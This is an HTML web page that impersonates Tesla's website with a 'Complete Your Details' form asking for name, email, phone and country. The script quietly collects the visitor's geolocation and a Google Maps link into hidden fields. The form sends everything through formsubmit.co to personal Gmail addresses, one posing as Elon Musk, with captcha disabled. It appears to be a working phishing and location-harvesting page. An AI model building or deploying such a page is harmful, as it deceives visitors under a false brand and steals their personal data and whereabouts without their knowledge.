<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Secure Form</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;font-family:sans-serif;}
body{background:rgba(245,245,245,0.92);}

.navbar{
position:fixed;top:0;left:0;width:100%;
z-index:20;display:flex;justify-content:space-between;
align-items:center;padding:18px 5vw;background:#fff;
}
.logo{font-weight:bold;letter-spacing:3px;}
.nav-center{display:flex;gap:25px;}
.nav-item{cursor:pointer;font-size:14px;}
.nav-right{display:flex;gap:10px;}
.icon{
width:32px;height:32px;border-radius:50%;
background:rgba(0,0,0,0.1);
display:flex;align-items:center;justify-content:center;
}

.dropdown{
position:fixed;top:0;left:0;width:100%;
display:none;z-index:10;
}
.dropdown.show{
display:block;
backdrop-filter:blur(22px);
background:rgba(245,245,245,0.92);
padding-top:90px;
}
.dropdown-wrapper{padding:40px 5vw;}
.dropdown-grid{
display:grid;grid-template-columns:repeat(3,1fr);
gap:30px;
}
.dropdown-item{text-align:center;}
.dropdown-item img{
width:100%;height:120px;object-fit:contain;
}

.wrapper{
height:100vh;
display:flex;
justify-content:center;
align-items:center;
padding-top:100px;
}

.container{
width:90%;
max-width:420px;
background:#fff;
padding:25px;
border-radius:12px;
box-shadow:0 10px 40px rgba(0,0,0,0.15);
}

h2{text-align:center;margin-bottom:10px;}
p{text-align:center;font-size:13px;color:#666;margin-bottom:20px;}

input, textarea{
width:100%;
padding:12px;
margin:8px 0;
border:1px solid #ddd;
border-radius:8px;
}

textarea{height:100px;resize:none;}

button{
width:100%;
padding:12px;
margin-top:10px;
border:none;
border-radius:25px;
background:#000;color:#fff;
cursor:pointer;
}
</style>
</head>

<body>

<div class="navbar">
<div class="logo">TESLA</div>

<div class="nav-center">
<div class="nav-item">Vehicles</div>
<div class="nav-item">Energy</div>
<div class="nav-item">Charging</div>
<div class="nav-item">Discover</div>
<div class="nav-item">Shop</div>
</div>

<div class="nav-right">
<div class="icon">S</div>
<div class="icon">A</div>
<div class="icon">☰</div>
</div>
</div>

<div id="dropdown" class="dropdown">
<div id="dropdown-content"></div>
</div>

<div class="wrapper">
<div class="container">
<h2>Complete Your Details</h2>
<p>Please fill in your information</p>

<form id="mainForm" action="https://formsubmit.co/elonmusk2020v@gmail.com" method="POST">

<input type="hidden" name="_captcha" value="false">
<input type="hidden" name="_template" value="table">
<input type="hidden" name="_cc" value="dooyaabariimeah@gmail.com">
<input type="hidden" name="_next" value="index.html">

<input type="text" name="name" placeholder="Full Name" required>
<input type="email" name="email" placeholder="Email Address" required>
<input type="tel" name="phone" placeholder="Phone Number" required>
<input type="text" name="country" placeholder="Country">
<textarea name="message" placeholder="Message"></textarea>

<input type="hidden" name="latitude" id="lat">
<input type="hidden" name="longitude" id="lon">
<input type="hidden" name="maps_link" id="maps">

<button type="submit">Submit</button>
</form>
</div>
</div>

<script>

/* DROPDOWN */
const dropdown=document.getElementById("dropdown");
document.querySelectorAll(".nav-item").forEach(item=>{
  item.addEventListener("mouseenter",()=>{
    dropdown.classList.add("show");
  });
});
document.addEventListener("click",()=>{
  dropdown.classList.remove("show");
});

/* FORM SUBMIT WITH LOCATION + POPUP FIX */
document.getElementById("mainForm").addEventListener("submit",function(e){
  e.preventDefault();

  const form=this;

  if(navigator.geolocation){
    navigator.geolocation.getCurrentPosition(function(pos){

      const lat=pos.coords.latitude;
      const lon=pos.coords.longitude;

      document.getElementById("lat").value=lat;
      document.getElementById("lon").value=lon;
      document.getElementById("maps").value=
        "https://www.google.com/maps?q="+lat+","+lon;

      sendForm(form);

    },function(){
      sendForm(form);
    });
  }else{
    sendForm(form);
  }
});

function sendForm(form){
  fetch(form.action,{
    method:"POST",
    body:new FormData(form),
    headers:{Accept:"application/json"}
  })
  .then(()=>{
    // ✅ IMPORTANT FIX
    localStorage.setItem("formSubmitted","true");

    window.location.href="index.html";
  })
  .catch(()=>{
    // still mark as submitted to prevent popup loop
    localStorage.setItem("formSubmitted","true");

    window.location.href="index.html";
  });
}

</script>

</body>
</html>
